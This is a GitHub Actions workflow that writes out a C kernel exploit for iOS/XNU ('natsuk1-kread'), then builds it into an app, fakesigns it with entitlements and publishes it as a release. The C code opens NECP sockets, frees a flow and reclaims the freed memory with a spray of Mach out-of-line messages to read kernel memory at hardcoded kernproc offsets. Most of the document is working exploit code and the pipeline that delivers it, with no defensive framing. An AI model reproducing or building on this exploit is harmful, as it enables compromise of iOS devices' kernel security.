name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/message.h>

          #include "nk_api.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif

          #define KBASE 0xFFFFFFF007004000ULL
          #define OFF_KERNPROC 0xBBB040ULL
          #define OFF_TASK_LIST 0x10D53F0ULL
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          #define SLIDE_FALLBACK 0x3D00000ULL

          #define NECP_ADD_CLIENT 0x01
          #define NECP_REMOVE_CLIENT 0x02
          #define NECP_COPY_RESULT 0x04
          #define NECP_ADD_FLOW 0x11
          #define NECP_REMOVE_FLOW 0x12
          #define GATE_BYTE 9

          #define NCF_SZ 0x400
          #define NCF_ASN 0x20
          #define NCF_READ_SIZE 0x18
          #define RESBUF 8192

          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap;
              va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)

          static void dumpw(const char *tag, const uint8_t *p, int n) {
              char line[1024];
              int off = 0;
              if (n > 24) n = 24;
              for (int i = 0; i < n; i++) {
                  uint64_t w;
                  memcpy(&w, p + i * 8, 8);
                  off += snprintf(line + off, sizeof(line) - off,
                                  "%02d:%016llx ", i, (unsigned long long)w);
                  if (off > 900) break;
              }
              LI(tag, "%s", line);
          }

          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }

          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }

          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fu, req, 16);
                  fu[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }

          static int ncpy(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }

          static int try_read(uint64_t target, uint8_t *out, int outsz) {
              int fd = nfd();
              if (fd < 0) { LE("READ", "open errno=%d", errno); return -1; }

              uint8_t cu[16], fu[16];
              if (nadd_client(fd, cu) != 0) { LE("READ", "add_client errno=%d", errno); close(fd); return -1; }
              if (nadd_flow(fd, cu, fu) != 0) { LE("READ", "add_flow errno=%d", errno); close(fd); return -1; }

              uint8_t fake[NCF_SZ];
              memset(fake, 0, sizeof(fake));
              *(uint64_t*)(fake + NCF_ASN) = target;

              int r1 = nrm_flow(fd, fu);
              LI("READ", "free fu ret=%d", r1);

              uint8_t *fake2 = malloc(NCF_SZ);
              if (!fake2) { close(fd); return -1; }
              memcpy(fake2, fake, NCF_SZ);

              uint8_t junk[NCF_SZ];
              memset(junk, 0x41, sizeof(junk));

              mach_port_t ex = MACH_PORT_NULL;
              mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ex);
              mach_port_insert_right(mach_task_self(), ex, ex, MACH_MSG_TYPE_MAKE_SEND);

              for (int i = 0; i < 32; i++) {
                  uint8_t mbuf[sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t)];
                  mach_msg_header_t *h = (mach_msg_header_t*)mbuf;
                  memset(h, 0, sizeof(mbuf));
                  h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                  h->msgh_size = sizeof(mbuf);
                  h->msgh_remote_port = ex;
                  h->msgh_id = 0x6000 + i;
                  mach_msg_body_t *b = (mach_msg_body_t*)(h + 1);
                  b->msgh_descriptor_count = 1;
                  mach_msg_ool_descriptor_t *o = (mach_msg_ool_descriptor_t*)(b + 1);
                  o->address = fake2;
                  o->size = NCF_SZ;
                  o->copy = MACH_MSG_VIRTUAL_COPY;
                  o->deallocate = FALSE;
                  o->type = MACH_MSG_OOL_DESCRIPTOR;
                  mach_msg(h, MACH_SEND_MSG, h->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
              }

              (void)junk;

              uint8_t f2[16];
              int r2 = nadd_flow(fd, cu, f2);
              LI("READ", "re-add ret=%d", r2);

              uint8_t buf[RESBUF];
              memset(buf, 0, sizeof(buf));
              int c = ncpy(fd, cu, buf, sizeof(buf));
              LI("READ", "copy ret=%d errno=%d", c, errno);

              if (out && outsz > 0 && c > 0) {
                  int n = c < outsz ? c : outsz;
                  memcpy(out, buf, n);
              }

              uint8_t drainbuf[2048];
              mach_msg_header_t *dh = (mach_msg_header_t*)drainbuf;
              for (int i = 0; i < 64; i++) {
                  dh->msgh_size = sizeof(drainbuf);
                  if (mach_msg(dh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(drainbuf),
                               ex, 1, MACH_PORT_NULL) != KERN_SUCCESS) break;
              }
              mach_port_destroy(mach_task_self(), ex);
              free(fake2);
              close(fd);
              return c;
          }

          static volatile int g_busy = 0;

          static int impl(void) {
              nk_log("");
              nk_log("=== natsuk1 v2.2 (natsuk1-kread-v12) ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("");
              LI("INIT", "NCF_ASN=0x%x NCF_READ_SIZE=0x%x", NCF_ASN, NCF_READ_SIZE);
              uint64_t kbase = KBASE + SLIDE_FALLBACK;
              LO("P1", "kbase=0x%llx", (unsigned long long)kbase);

              int fd = nfd();
              if (fd < 0) { LE("P2", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("P2", "necp OK");

              uint8_t buf[RESBUF];
              memset(buf, 0, sizeof(buf));
              int rc = try_read(kbase + OFF_KERNPROC, buf, sizeof(buf));
              LI("P3", "kread kernproc ret=%d", rc);

              if (rc > 0) {
                  dumpw("P3", buf, rc / 8 > 8 ? 8 : rc / 8);
                  uint64_t found = 0;
                  for (int i = 0; i + 8 <= rc; i++) {
                      uint64_t v;
                      memcpy(&v, buf + i, 8);
                      if (is_kptr(v)) {
                          LO("P3", "kptr at +0x%x = 0x%llx", i, (unsigned long long)v);
                          if (v == 0xFFFFFFF00ADEE310ULL) {
                              LO("P3", "MATCH: kernproc reads OK");
                          }
                          if (!found) found = v;
                      }
                  }
                  if (found) {
                      uint32_t pid = (uint32_t)(found & 0xFFFFFFFF);
                      LI("P4", "first kptr low32=0x%x", pid);
                  }
              } else {
                  LE("P3", "kread failed");
              }
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }
          NECP

      - name: Verify
        run: |
          set -euo pipefail
          F=natsuk1/Exploit/necp.c
          wc -l "$F"
          test "$(grep -c 'NCF_ASN 0x20' "$F")" = "1"
          test "$(grep -c 'NCF_READ_SIZE 0x18' "$F")" = "1"
          test "$(grep -c 'natsuk1-kread-v12' "$F")" = "1"
          test "$(grep -c 'int nk_necp_run(void)' "$F")" = "1"
          test "$(grep -c 'static int impl(void)' "$F")" = "1"
          test "$(grep -c 'static int try_read' "$F")" = "1"
          grep -n 'NCF_ASN 0x20' "$F"
          grep -n 'try_read(kbase' "$F"
          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
          clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
            -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F"
          echo "syntax OK"

      - name: Install tools
        run: brew install xcodegen ldid || true

      - name: Generate xcodeproj
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package app tarball
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"

      - name: Upload app artifact
        uses: actions/upload-artifact@v4
        with:
          name: natsuk1-app-tar
          path: natsuk1-app.tar.gz
          if-no-files-found: error
          retention-days: 3

      - name: Package and release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
          gh release create development natsuk1.ipa \
            --target "${GITHUB_SHA}" --title "Development" \
            --prerelease --latest=false \
            --notes "kread v12: NCF_ASN=0x20 (real offset from copy_result disasm)"

      - name: Commit
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add natsuk1/Exploit/necp.c
          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
          git commit -m "kread v12: NCF_ASN=0x20 [skip ci]"
          git push